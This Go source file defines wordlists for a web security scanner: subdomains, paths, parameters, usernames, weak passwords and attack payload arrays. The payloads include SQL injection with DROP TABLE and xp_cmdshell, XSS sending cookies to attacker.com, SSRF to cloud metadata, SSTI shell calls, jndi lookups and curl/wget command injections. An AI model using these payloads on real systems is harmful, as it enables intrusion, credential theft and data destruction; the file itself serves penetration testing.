package wordlists

import (
	"fmt"
	"math/rand"
	"strings"
)

type WordlistType int

const (
	Subdomains WordlistType = iota
	Paths
	Params
	Payloads
	Usernames
	Passwords
)

func (t WordlistType) String() string {
	switch t {
	case Subdomains:
		return "subdomains"
	case Paths:
		return "paths"
	case Params:
		return "params"
	case Payloads:
		return "payloads"
	case Usernames:
		return "usernames"
	case Passwords:
		return "passwords"
	default:
		return "unknown"
	}
}

type Wordlist struct {
	Name    WordlistType `json:"name"`
	Label   string       `json:"label"`
	Entries []string     `json:"entries"`
	Source  string       `json:"source"`
}

var SubdomainWordlist = Wordlist{
	Name:   Subdomains,
	Label:  "Common Subdomains",
	Source: "SecLists/Discovery/DNS/subdomains-top1million-110000.txt",
	Entries: []string{
		"admin", "api", "dev", "staging", "www", "mail", "webmail", "test", "beta", "blog",
		"shop", "store", "app", "m", "mobile", "cdn", "static", "media", "img", "css",
		"js", "assets", "download", "downloads", "files", "file", "docs", "doc", "help",
		"support", "status", "portal", "login", "signin", "auth", "account", "accounts",
		"user", "users", "profile", "profiles", "member", "members", "client", "clients",
		"partner", "partners", "vendor", "vendors", "backup", "backups", "db", "database",
		"sql", "mysql", "postgres", "redis", "mongo", "elastic", "search", "kibana",
		"grafana", "prometheus", "monitor", "monitoring", "metrics", "logs", "logging",
		"wiki", "confluence", "jira", "jenkins", "ci", "cd", "build", "deploy",
		"git", "github", "gitlab", "bitbucket", "svn", "repo", "repos", "code",
		"internal", "corp", "corporate", "enterprise", "intranet", "vpn", "remote",
		"proxy", "gateway", "router", "switch", "network", "ns", "dns", "dns1",
		"dns2", "mx", "smtp", "imap", "pop3", "pop", "smtp-relay", "relay",
		"ftp", "sftp", "ssh", "telnet", "rdp", "vnc", "console", "terminal",
		"panel", "cpanel", "whm", "plesk", "directadmin", "phpmyadmin", "phpmyadmin2",
		"adminer", "pma", "webmin", "usermin", "munin", "nagios", "zabbix",
		"icinga", "sensu", "cacti", "observium", "librenms", "netdata", "uptime",
		"ping", "speedtest", "test-speed", "bandwidth", "statuspage", "status-page",
		"calendar", "cal", "mail2", "mail1", "email", "owa", "exchange", "ews",
		"autodiscover", "lync", "skype", "teams", "zoom", "meet", "webex",
		"pay", "payment", "checkout", "cart", "basket", "order", "orders",
		"invoice", "invoices", "billing", "subscribe", "subscription", "news",
		"newsletter", "feed", "rss", "atom", "xmlrpc", "xmlrpc.php", "wp-admin",
		"wp-content", "wp-includes", "wordpress", "wp", "joomla", "drupal",
		"moodle", "phpbb", "vbulletin", "smf", "mybb", "nextcloud", "owncloud",
		"cloud", "sync", "upload", "uploads", "downloads", "public", "private",
		"secure", "security", "sso", "oauth", "saml", "openid", "idp", "adfs",
		"ldap", "radius", "tacacs", "splunk", "sumo", "siem", "soc", "honeypot",
		"honeypots", "sandbox", "devops", "k8s", "kubernetes", "docker", "registry",
		"rancher", "swarm", "mesos", "nomad", "consul", "vault", "etcd", "zk", "zookeeper",
		"kafka", "rabbitmq", "activemq", "mq", "queue", "worker", "workers",
		"batch", "job", "jobs", "cron", "schedule", "scheduler", "task", "tasks",
		"audit", "audits", "compliance", "gdpr", "hipaa", "pci", "iso", "sox",
		"legal", "terms", "privacy", "copyright", "dmca", "cookies", "cookie",
		"policy", "policies", "agreement", "agreements", "eula", "license",
		"ip", "whois", "dnssec", "ns1", "ns2", "ns3", "ns4", "cname",
		"txt", "dkim", "spf", "dmarc", "mx1", "mx2", "mx3",
		"owa", "autodiscover", "lyncdiscover", "sip", "lyncweb", "meet",
		"dialin", "conf", "conference", "bridge", "phone", "telephony",
		"api-docs", "docs-api", "swagger", "openapi", "redoc", "graphql",
		"graph", "gql", "playground", "api-v1", "api-v2", "v1", "v2",
		"v3", "version", "versions", "latest", "old", "new", "alpha", "beta",
		"demo", "sandbox", "playground", "lab", "labs", "stage", "staging",
		"prod", "production", "dev", "development", "qa", "testing",
		"uat", "preprod", "pre-production", "release", "release-candidate",
		"rc", "nightly", "canary", "edge", "experimental", "feature",
	},
}

var PathWordlist = Wordlist{
	Name:   Paths,
	Label:  "Common Web Paths",
	Source: "SecLists/Discovery/Web-Content/common.txt",
	Entries: []string{
		"admin", "administrator", "adm", "config", "configuration", "setup", "install",
		"wp-admin", "wp-content", "wp-includes", "wordpress", "wp", "joomla", "administrator",
		"drupal", "moodle", "phpbb", "phpmyadmin", "pma", "adminer", "webmin", "cpanel",
		".env", ".git/config", ".git/HEAD", ".gitignore", ".htaccess", ".htpasswd",
		".svn", ".svn/entries", ".DS_Store", "crossdomain.xml", "clientaccesspolicy.xml",
		"robots.txt", "sitemap.xml", "sitemap", "sitemap_index.xml", "rss.xml", "atom.xml",
		"feed", "rss", "atom", "opensearch.xml", "browserconfig.xml",
		"login", "signin", "sign-in", "logon", "log-in", "logout", "signout", "sign-out",
		"register", "signup", "sign-up", "forgot", "reset", "reset-password", "forgot-password",
		"api", "api/v1", "api/v2", "api/v3", "v1", "v2", "v3", "graphql", "graph",
		"swagger", "swagger-ui", "swagger-ui.html", "swagger.json", "swagger.yaml",
		"api-docs", "api-doc", "docs", "doc", "documentation", "openapi.json", "openapi.yaml",
		"dashboard", "panel", "console", "control", "controlpanel", "cp", "server-status",
		"server-info", "info", "phpinfo.php", "php-info.php", "test.php", "info.php",
		"upload", "uploads", "download", "downloads", "files", "file", "media", "img",
		"images", "css", "js", "assets", "static", "public", "private", "tmp", "temp",
		"backup", "backups", "db", "database", "dump", "dumps", "export", "import",
		"sql", "mysql", "mariadb", "postgres", "mongodb", "redis", "elasticsearch",
		"kibana", "grafana", "prometheus", "jenkins", "jira", "confluence", "wiki",
		"git", "github", "gitlab", ".git", ".svn", ".hg", ".bzr",
		"index", "index.php", "index.html", "index.htm", "default", "default.aspx",
		"home", "main", "about", "contact", "help", "faq", "support", "status",
		"search", "browse", "category", "categories", "product", "products", "item",
		"items", "blog", "news", "article", "articles", "page", "pages", "post", "posts",
		"user", "users", "profile", "profiles", "account", "accounts", "member", "members",
		"order", "orders", "cart", "checkout", "payment", "billing", "invoice", "invoices",
		"subscribe", "subscription", "newsletter", "mail", "email", "webmail", "roundcube",
		"squirrelmail", "rainloop", "snappymail",
		"proxy", "proxy.pac", "wpad.dat", "wpad", "cgi-bin", "cgi", "fcgi",
		"shell", "cmd", "command", "exec", "execute", "run", "system",
		"debug", "logger", "log", "logs", "logging", "error", "errors", "error_log",
		"access", "access_log", "access.log", "error.log", "debug.log",
		"wsdl", "soap", "xmlrpc", "xmlrpc.php", "rpc", "rest", "restful",
		"webhook", "hooks", "callback", "notify", "notification", "notifications",
		"socket", "sockets", "websocket", "wss", "stream", "streaming",
		"health", "healthcheck", "healthz", "readyz", "livez", "metrics", "stats",
		"status", "ping", "pong", "version", "versions",
		"app", "app-dev", "app-staging", "app-prod", "mobile", "m", "mobile-api",
		"partners", "partner", "affiliate", "affiliates", "referral", "referrals",
		"tracking", "track", "analytics", "pixel", "beacon", "collect",
		"cdn", "cdn-cgi", "content", "uploads", "downloads", "storage",
		"aws", "s3", "bucket", "buckets", "gcs", "gcp", "azure", "blob",
		"storage", "firebase", "firestore", "storage.googleapis.com",
		"vendor", "vendors", "node_modules", "bower_components", "lib", "library",
		"src", "source", "build", "dist", "out", "target", "release", "debug",
		".well-known", ".well-known/security.txt", ".well-known/assetlinks.json",
		".well-known/apple-app-site-association", ".well-known/change-password",
		".well-known/openid-configuration", ".well-known/oauth-authorization-server",
		".well-known/webfinger", ".well-known/host-meta", ".well-known/host-meta.json",
		"security.txt", "humans.txt", "ads.txt", "app-ads.txt",
		"forms", "form", "survey", "surveys", "feedback", "suggestion", "suggestions",
		"complaint", "complaints", "report", "reports", "abuse", "terms", "conditions",
		"privacy", "privacy-policy", "cookie", "cookies", "legal", "disclaimer",
		"license", "licenses", "credits", "copyright", "dmca",
		"style.css", "main.css", "app.css", "bundle.js", "main.js", "app.js",
		"service-worker.js", "manifest.json", "manifest.webmanifest",
		"security.txt", "SECURITY.md", "CONTRIBUTING.md", "CHANGELOG.md",
		"readme", "README.md", "readme.html", "README.txt",
		"todo", "todos", "todo.txt", "TODO.md", "notes.txt", "NOTES.md",
		"changelog", "CHANGELOG.md", "changelog.txt", "changes.txt",
		"upgrade", "migrate", "migration", "migrations", "schema", "schemas",
	},
}

var ParamWordlist = Wordlist{
	Name:   Params,
	Label:  "Common HTTP Parameters",
	Source: "SecLists/Discovery/Web-Content/burp-parameter-names.txt",
	Entries: []string{
		"id", "ID", "id_user", "user_id", "userId", "userid", "uid", "UUID", "uuid",
		"name", "username", "user_name", "uname", "nick", "nickname", "display_name",
		"email", "mail", "e-mail", "email_address", "emailaddress", "user_email",
		"password", "pass", "passwd", "pwd", "password_confirm", "confirm_password",
		"token", "access_token", "refresh_token", "api_key", "apikey", "API_KEY",
		"secret", "secret_key", "secretkey", "client_secret", "client_id",
		"auth", "authorization", "authenticity_token", "csrf", "csrf_token",
		"nonce", "state", "redirect_uri", "redirect", "return_url", "callback_url",
		"url", "URL", "link", "href", "src", "action", "target", "destination",
		"page", "pages", "page_id", "limit", "offset", "start", "end", "count",
		"sort", "order", "order_by", "sort_by", "dir", "direction", "asc", "desc",
		"q", "query", "search", "keywords", "term", "terms", "filter", "filters",
		"type", "types", "category", "categories", "cat", "tag", "tags",
		"format", "fmt", "output", "response", "callback", "jsonp", "jsonpcallback",
		"debug", "verbose", "v", "trace", "profile", "benchmark", "test",
		"action", "method", "do", "operation", "command", "cmd", "exec",
		"file", "filename", "file_name", "path", "dir", "directory", "folder",
		"upload", "download", "save", "export", "import", "read", "write",
		"data", "json", "xml", "yaml", "config", "settings", "options",
		"lang", "language", "locale", "country", "timezone", "tz", "currency",
		"theme", "template", "view", "layout", "skin", "style",
		"mode", "env", "environment", "host", "hostname", "port", "protocol",
		"server", "client", "agent", "user-agent", "referer", "referrer", "origin",
		"ip", "remote_addr", "x-forwarded-for", "x-real-ip", "cf-connecting-ip",
		"version", "ver", "v", "api-version", "api_version",
		"timestamp", "ts", "time", "date", "datetime", "expires", "expiry",
		"signature", "sig", "hash", "checksum", "hmac", "digest",
		"key", "public_key", "private_key", "pubkey", "privkey",
		"address", "wallet", "contract", "tx", "txn", "transaction",
		"chain", "chain_id", "network", "network_id", "rpc", "rpc_url",
		"amount", "value", "price", "cost", "fee", "rate", "total", "subtotal",
		"quantity", "qty", "count", "num", "number", "index",
		"title", "subject", "body", "text", "content", "message", "msg",
		"status", "state", "flag", "flags", "active", "enabled", "disabled",
		"role", "roles", "permission", "permissions", "perm", "rights",
		"group", "groups", "team", "teams", "org", "organization",
		"scope", "scopes", "grant_type", "response_type", "client_assertion",
		"username", "login", "signin", "register", "signup", "subscribe",
		"first_name", "last_name", "full_name", "middle_name", "given_name",
		"phone", "phone_number", "mobile", "cell", "telephone", "tel",
		"fax", "zip", "zipcode", "postal", "postal_code", "country_code",
		"city", "state", "province", "region", "street", "address1", "address2",
		"lat", "lng", "long", "latitude", "longitude", "geo", "coordinates",
		"birthday", "birthdate", "dob", "age", "gender", "sex",
		"website", "url", "homepage", "blog", "social",
		"image", "img", "avatar", "photo", "picture", "icon", "logo",
		"color", "colour", "size", "width", "height", "length", "weight",
		"description", "desc", "summary", "abstract", "details",
		"note", "notes", "comment", "comments", "review", "reviews",
		"rating", "stars", "score", "like", "likes", "vote", "votes",
		"share", "shares", "view", "views", "click", "clicks",
		"override", "force", "skip", "ignore", "bypass", "allow",
	},
}

var PayloadWordlist = Wordlist{
	Name:   Payloads,
	Label:  "Common Attack Payloads",
	Source: "PayloadsAllTheThings",
}

var sqlInjections = []string{
	"' OR '1'='1", "' OR '1'='1' --", "\" OR \"1\"=\"1", "' OR 1=1 --",
	"' OR 1=1#", "' OR 1=1/*", "admin' --", "admin' #", "admin'/*",
	"' UNION SELECT NULL--", "' UNION SELECT 1,2,3--", "1' ORDER BY 1--",
	"1' ORDER BY 2--", "1' ORDER BY 3--", "' UNION SELECT @@version--",
	"' UNION SELECT version()--", "' AND 1=1--", "' AND 1=2--",
	"'; DROP TABLE users--", "'; DROP TABLE users;#", "' WAITFOR DELAY '00:00:05'--",
	"1' AND SLEEP(5)--", "1' AND SLEEP(5)#", "' OR '1'='1' /*",
	"' UNION SELECT NULL, NULL, NULL--", "' UNION SELECT database()--",
	"' UNION SELECT user()--", "' UNION SELECT table_name FROM information_schema.tables--",
	"' UNION SELECT column_name FROM information_schema.columns--",
	"' UNION SELECT load_file('/etc/passwd')--",
	"' AND 1=1 UNION SELECT 1,2,3--", "1 AND (SELECT * FROM users) = 1--",
	"' OR 'unusual' = 'unusual'", "' OR 'x'='x", "' OR 'a'='a",
	"1' AND '1'='1", "1' AND '1'='2", "1' AND 1=(SELECT COUNT(*) FROM users)--",
	"' OR 1=1 INTO @a,@b--", "' OR 1=1 INTO OUTFILE '/tmp/out.txt'--",
	"' OR 1=1 INTO DUMPFILE '/tmp/out.txt'--", "'; EXEC xp_cmdshell('whoami')--",
	"1' EXEC sp_helpdb--", "1' EXEC sp_helpuser--",
	"1' OR '1'='1' ORDER BY 1--", "1' HAVING 1=1--",
	"' GROUP BY 1 HAVING 1=1--", "' OR EXISTS(SELECT * FROM users)--",
}

var xssPayloads = []string{
	"<script>alert(1)</script>", "<script>alert('XSS')</script>", "<img src=x onerror=alert(1)>",
	"<img src=x onerror=alert('XSS')>", "<svg onload=alert(1)>", "<body onload=alert(1)>",
	"<input onfocus=alert(1) autofocus>", "<textarea onfocus=alert(1) autofocus>",
	"<details open ontoggle=alert(1)>", "<marquee onstart=alert(1)>",
	"<script>fetch('https://attacker.com/'+document.cookie)</script>",
	"<script>new Image().src='https://attacker.com/'+document.cookie</script>",
	"<img src=x onerror='fetch(\"https://attacker.com/\"+document.cookie)'>",
	"<script>document.location='https://attacker.com/?c='+document.cookie</script>",
	"\"><script>alert(1)</script>", "';alert(1);//", "\";alert(1);//",
	"</script><script>alert(1)</script>", "<script>alert(1)</sc<script>ript>",
	"<img src=x onerror=alert(1) onload=alert(2)>", "<svg/onload=alert(1)>",
	"<svg><script>alert(1)</script></svg>", "<details/x/onclick=alert(1)>",
	"<body/onload=alert(1)>", "<input/onfocus=alert(1)>",
	"<iframe src=javascript:alert(1)>", "<iframe srcdoc=\"<script>alert(1)</script>\">",
	"<a href=javascript:alert(1)>click</a>", "<img src=\"x\"><script>alert(1)</script>",
	"javascript:alert(1)", "javascripT:alert(1)", "java%0d%0ascript:alert(1)",
	"<scr<script>ipt>alert(1)</script>", "<<script>alert(1)</script>",
	"<ScRiPt>alert(1)</ScRiPt>", "<sCrIpT>alert(1)</sCrIpT>",
	"<SCRIPT>alert(1)</SCRIPT>", "<script>alert(String.fromCharCode(88,83,83))</script>",
	"<script>\\u0061lert(1)</script>", "<script>eval('alert(1)')</script>",
	"<img src=x:alert(alt) onerror=eval(src)>", "<body onscroll=alert(1)><br><br><br><br>",
	"<style>body{background-image:url(javascript:alert(1))}</style>",
	"<div style=background-image:url(javascript:alert(1))>",
	"<link rel=stylesheet href=javascript:alert(1)>",
	"<table background=javascript:alert(1)>", "<td background=javascript:alert(1)>",
	"<math><mtext><table><mglyph><svg><mtext><style><img src=x onerror=alert(1)>",
}

var ssrfPayloads = []string{
	"http://127.0.0.1", "http://localhost", "http://0.0.0.0", "http://[::1]",
	"http://169.254.169.254", "http://169.254.169.254/latest/meta-data/",
	"http://169.254.169.254/latest/user-data/",
	"http://metadata.google.internal", "http://metadata.google.internal/computeMetadata/v1/",
	"http://100.100.100.200", "http://100.100.100.200/latest/meta-data/",
	"http://10.0.0.1", "http://172.16.0.1", "http://192.168.1.1",
	"http://127.0.0.1:22", "http://127.0.0.1:3306", "http://127.0.0.1:6379",
	"http://127.0.0.1:9200", "http://127.0.0.1:27017",
	"http://127.0.0.1:8000", "http://127.0.0.1:8080", "http://127.1",
	"http://2130706433", "http://0x7f000001", "http://0x7f.0.0.1",
	"http://0x7f000001:8080", "http://0", "http://0:8080",
	"http://localhost:22", "http://localhost:3306", "http://localhost:6379",
	"http://localhost:9200", "http://localtest.me", "http://lvh.me",
	"http://spoofed.burpcollaborator.net", "http://burpcollaborator.net",
	"http://nslookup.example.com", "http://internal.app",
	"http://consul.service.consul:8500", "http://127.0.0.1.nip.io",
	"http://1.1.1.1.nip.io", "file:///etc/passwd", "file:///proc/self/environ",
	"gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aFLUSHALL%0d%0a",
	"dict://127.0.0.1:6379/info",
}

var sstiPayloads = []string{
	"{{7*7}}", "${7*7}", "<%= 7*7 %>", "${{7*7}}", "#{7*7}",
	"{{config}}", "{{self}}", "{{request}}", "{{settings}}",
	"{{ ''.__class__.__mro__[2].__subclasses__() }}",
	"{{ ''.__class__.__mro__ }}",
	"{{ ''.__class__.__mro__[1].__subclasses__() }}",
	"{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}",
	"{{ cycler.__init__.__globals__.os.popen('id').read() }}",
	"{{ joiner.__init__.__globals__.os.popen('id').read() }}",
	"{{ namespace.__init__.__globals__.os.popen('id').read() }}",
	"{{ get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read() }}",
	"${7*7}", "${java:os}", "${env}", "${system:os}",
	"${jndi:ldap://attacker.com/a}", "${jndi:rmi://attacker.com/a}",
	"<%= system('id') %>", "<%= Dir.entries('/') %>",
	"<%= IO.popen('id').read() %>", "<%= `id` %>",
	"#{7*7}", "#{system('id')}", "#{ IO.popen('id').read() }",
	"{{#with \"s\" as |string|}}", "{{#with \"e\"}}",
	"{{constructor.constructor('return this.process.env')()}}",
	"{{_labs.rumbletools.api.fn()}}",
}

var lfiPayloads = []string{
	"/etc/passwd", "/etc/shadow", "/etc/hosts", "/etc/hostname",
	"/etc/resolv.conf", "/etc/issue", "/etc/issue.net",
	"/etc/group", "/etc/sudoers", "/etc/ssh/sshd_config",
	"/proc/self/environ", "/proc/self/fd/0", "/proc/self/fd/1",
	"/proc/self/fd/2", "/proc/self/cmdline", "/proc/self/status",
	"/proc/self/net/arp", "/proc/self/net/tcp",
	"/proc/version", "/proc/1/cmdline", "/proc/1/environ",
	"../../../etc/passwd", "../../../etc/shadow",
	"..\\..\\..\\windows\\win.ini",
	"..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
	"....//....//....//etc/passwd",
	"..\\\\/..\\\\/..\\\\/etc/passwd",
	"/etc/passwd%00", "/etc/passwd%2500",
	"/etc/passwd%00.png", "/etc/passwd%2500.png",
	"..%2f..%2f..%2fetc/passwd",
	"..%252f..%252f..%252fetc/passwd",
	"..%c0%af..%c0%af..%c0%afetc/passwd",
	"..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd",
	"/var/log/apache2/access.log", "/var/log/apache2/error.log",
	"/var/log/nginx/access.log", "/var/log/nginx/error.log",
	"/var/log/httpd/access_log", "/var/log/httpd/error_log",
	"/var/log/messages", "/var/log/syslog",
	"/var/log/auth.log", "/var/log/secure",
	"/var/log/mysql/error.log", "/var/log/postgresql/postgresql.log",
	"php://filter/convert.base64-encode/resource=/etc/passwd",
	"php://filter/convert.base64-encode/resource=config.php",
	"php://filter/read=convert.base64-encode/resource=index.php",
	"php://filter/convert.base64-encode/resource=../../etc/passwd",
	"php://filter/resource=/etc/passwd",
	"php://filter/read=string.rot13/resource=/etc/passwd",
	"expect://id", "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
	"file:///etc/passwd", "file:///proc/self/environ",
}

var commandInjectionPayloads = []string{
	"; id", "| id", "& id", "&& id", "|| id", "`id`",
	"$(id)", "$(whoami)", "; whoami", "| whoami", "& whoami",
	"; ls -la", "| ls -la", "& ls -la", "`ls -la`",
	"$(cat /etc/passwd)", "; cat /etc/passwd", "| cat /etc/passwd",
	"& ping -c 10 127.0.0.1", "| ping -n 10 127.0.0.1",
	"& nslookup attacker.com", "| nslookup attacker.com",
	"& curl http://attacker.com", "| curl http://attacker.com",
	"& wget http://attacker.com", "| wget http://attacker.com",
	"%0aid", "%0Aid", "%0a%0aid", "%0a|id",
	"; sleep 5", "| sleep 5", "& sleep 5", "`sleep 5`",
	"$(sleep 5)", "& ping -c 5 127.0.0.1", "| ping -c 5 127.0.0.1",
	"& timeout /t 5", "| timeout /t 5",
	"'; id; '", "\"; id; \"", "' | id", "\" | id",
	"1;id", "1|id", "1&id", "1&&id",
	"| echo test", "& echo test", "; echo test",
	"| type C:\\windows\\win.ini", "& type C:\\windows\\win.ini",
	"; type C:\\windows\\win.ini",
}

var openRedirectPayloads = []string{
	"//google.com", "//evil.com", "https://evil.com",
	"http://evil.com", "//evil.com/", "//evil.com%2f@google.com",
	"//evil.com%2f..%2fgoogle.com",
	"http://evil.com:80@google.com", "https://evil.com:443@google.com",
	"/\\evil.com", "/\\/evil.com", "\\\\evil.com",
	"https:evil.com", "http:evil.com",
	"javascript:alert(1)", "javascript:document.location='https://evil.com'",
	"data:text/html,<script>alert(1)</script>",
	"data:text/html;base64,PHNjcmk=",
	"///evil.com", "////evil.com", ".evil.com",
	"http://evil.com.", "http://evil.com%2F",
	"@evil.com", "http://evil.com?",
	"http://evil.com#", "http://evil.com?@google.com",
}

func init() {
	allPayloads := make([]string, 0, len(sqlInjections)+len(xssPayloads)+len(ssrfPayloads)+len(sstiPayloads)+len(lfiPayloads)+len(commandInjectionPayloads)+len(openRedirectPayloads))
	allPayloads = append(allPayloads, sqlInjections...)
	allPayloads = append(allPayloads, xssPayloads...)
	allPayloads = append(allPayloads, ssrfPayloads...)
	allPayloads = append(allPayloads, sstiPayloads...)
	allPayloads = append(allPayloads, lfiPayloads...)
	allPayloads = append(allPayloads, commandInjectionPayloads...)
	allPayloads = append(allPayloads, openRedirectPayloads...)
	PayloadWordlist.Entries = allPayloads
}

var UsernameWordlist = Wordlist{
	Name:   Usernames,
	Label:  "Common Usernames",
	Source: "SecLists/Usernames/top-usernames-shortlist.txt",
	Entries: []string{
		"admin", "administrator", "root", "superuser", "super", "user",
		"guest", "demo", "test", "testing", "tester", "info", "support",
		"help", "contact", "webmaster", "postmaster", "hostmaster",
		"mail", "nobody", "noreply", "no-reply", "sysadmin", "system",
		"sa", "dba", "dbadmin", "oracle", "mysql", "postgres",
		"backup", "backupadm", "git", "svn", "jenkins", "jira",
		"confluence", "wiki", "ops", "devops", "developer", "dev",
		"manager", "management", "hr", "humanresources", "finance",
		"accounting", "billing", "sales", "marketing", "pr", "publicrelations",
		"ceo", "cto", "cfo", "coo", "cio", "cmo", "director",
		"board", "chairman", "president", "vp", "vicepresident",
		"analyst", "analysts", "engineer", "engineers",
		"monitor", "monitoring", "status", "alerts", "alert",
		"service", "services", "api", "apiuser", "bot", "chatbot",
		"log", "logs", "logger", "audit", "auditor",
		"temp", "temporary", "default", "anonymous",
		"ubnt", "pi", "raspberry", "nagios", "zabbix", "icinga",
		"tomcat", "jboss", "weblogic", "glassfish", "wildfly",
		"ftp", "ftpuser", "sftp", "ssh", "sshd",
		"vpn", "openvpn", "wireguard", "proxy", "squid",
		"nobody", "daemon", "bin", "sync", "shutdown", "halt",
		"lp", "games", "nscd", "sshd", "rpc", "rpcuser",
	},
}

var PasswordWordlist = Wordlist{
	Name:   Passwords,
	Label:  "Common Weak Passwords",
	Source: "SecLists/Passwords/Common-Credentials/10k-most-common.txt",
	Entries: []string{
		"123456", "password", "12345678", "qwerty", "123456789",
		"12345", "1234", "111111", "1234567", "sunshine",
		"qwerty123", "iloveyou", "princess", "admin", "welcome",
		"666666", "abc123", "football", "123123", "monkey",
		"654321", "!@#$%^&*", "charlie", "aa123456", "donald",
		"password1", "qwerty12345", "123qwe", "letmein", "password123",
		"dragon", "master", "login", "hello", "trustno1",
		"passw0rd", "shadow", "master123", "batman", "696969",
		"jennifer", "222222", "cheese", "solo", "lovely",
		"superman", "ninja", "mustang", "ashley", "michael",
		"asdfgh", "qwertyuiop", "pass", "1234567890", "senha",
		"zxcvbnm", "987654321", "555555", "7777777", "qwerty1",
		"1qaz2wsx", "baseball", "abcd1234", "password!", "changeme",
		"summer", "winter", "spring", "autumn", "access",
		"passwd", "cloud", "server", "secret", "test123",
		"ilovegod", "corvette", "fender", "midnight", "thomas",
		"andrew", "joshua", "matthew", "daniel", "steven",
		"jessica", "nicole", "amanda", "jennifer", "michelle",
	},
}

var SecListReferences = map[string]string{
	"subdomains": "https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/subdomains-top1million-110000.txt",
	"paths":      "https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/common.txt",
	"params":     "https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt",
	"payloads":   "https://github.com/swisskyrepo/PayloadsAllTheThings",
	"usernames":  "https://github.com/danielmiessler/SecLists/blob/master/Usernames/top-usernames-shortlist.txt",
	"passwords":  "https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10k-most-common.txt",
}

var PayloadsAllTheThingsReferences = map[string]string{
	"sqli":              "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection",
	"xss":               "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection",
	"ssrf":              "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SSRF%20Injection",
	"ssti":              "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection",
	"lfi":               "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LFI%20to%20RCE",
	"command_injection": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection",
	"open_redirect":     "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect",
}

type Registry struct {
	wordlists map[WordlistType]*Wordlist
	byName    map[string]*Wordlist
}

var defaultRegistry *Registry

func init() {
	defaultRegistry = NewRegistry()
	defaultRegistry.Register(&SubdomainWordlist)
	defaultRegistry.Register(&PathWordlist)
	defaultRegistry.Register(&ParamWordlist)
	defaultRegistry.Register(&PayloadWordlist)
	defaultRegistry.Register(&UsernameWordlist)
	defaultRegistry.Register(&PasswordWordlist)
}

func NewRegistry() *Registry {
	return &Registry{
		wordlists: make(map[WordlistType]*Wordlist),
		byName:    make(map[string]*Wordlist),
	}
}

func (r *Registry) Register(wl *Wordlist) {
	r.wordlists[wl.Name] = wl
	r.byName[strings.ToLower(wl.Label)] = wl
}

func GetWordlist(name string) (*Wordlist, error) {
	lower := strings.ToLower(name)
	for _, wl := range defaultRegistry.wordlists {
		if strings.ToLower(wl.Label) == lower || strings.ToLower(wl.Name.String()) == lower {
			return wl, nil
		}
	}
	if wl, ok := defaultRegistry.byName[lower]; ok {
		return wl, nil
	}
	return nil, fmt.Errorf("wordlist not found: %s", name)
}

func ListWordlists() []string {
	var names []string
	for _, wl := range defaultRegistry.wordlists {
		names = append(names, fmt.Sprintf("%s (%s: %d entries)", wl.Label, wl.Name.String(), len(wl.Entries)))
	}
	return names
}

func RandomPayload(vulnType string) string {
	var pool []string
	switch strings.ToLower(vulnType) {
	case "sqli", "sql-injection", "sql_injection":
		pool = sqlInjections
	case "xss", "cross-site-scripting", "cross_site_scripting":
		pool = xssPayloads
	case "ssrf", "server-side-request-forgery", "server_side_request_forgery":
		pool = ssrfPayloads
	case "ssti", "server-side-template-injection", "server_side_template_injection":
		pool = sstiPayloads
	case "lfi", "local-file-inclusion", "local_file_inclusion":
		pool = lfiPayloads
	case "command-injection", "command_injection", "cmd-injection", "cmd_injection", "rce":
		pool = commandInjectionPayloads
	case "open-redirect", "open_redirect":
		pool = openRedirectPayloads
	default:
		allPayloads := make([]string, 0)
		allPayloads = append(allPayloads, sqlInjections...)
		allPayloads = append(allPayloads, xssPayloads...)
		allPayloads = append(allPayloads, ssrfPayloads...)
		allPayloads = append(allPayloads, sstiPayloads...)
		allPayloads = append(allPayloads, lfiPayloads...)
		allPayloads = append(allPayloads, commandInjectionPayloads...)
		allPayloads = append(allPayloads, openRedirectPayloads...)
		pool = allPayloads
	}
	if len(pool) == 0 {
		return ""
	}
	return pool[rand.Intn(len(pool))]
}
